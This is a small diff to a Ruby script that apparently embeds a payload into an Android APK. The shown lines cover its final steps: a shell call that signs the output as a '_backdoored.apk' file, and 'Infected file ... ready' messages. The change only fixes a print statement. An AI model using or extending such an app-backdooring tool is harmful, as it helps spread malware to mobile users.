@@ -1,6 +1,4 @@
 #!/usr/bin/env ruby
-# encoding: utf-8
-
 require 'nokogiri'
 require 'fileutils'
 require 'optparse'
@@ -233,6 +231,6 @@ unless (File.readable?(injected_apk))
 puts "[-] Error creating injection APK,If you haven't Android-SDK please install it.".red
 exit(1);
 end
-puts "[10] Signing".yellow + File.basename(injected_apk)+.cyan + "\n"
+puts "[10] Signing".yellow + File.basename(injected_apk)+ "\n"
 `$(pwd)/embed_tools/signapk.sh #{injected_apk} $(pwd)/__#{apkfile}_backdoored.apk`
 puts "[11] Infected file __#{apkfile}_backdoored.apk ready.".green
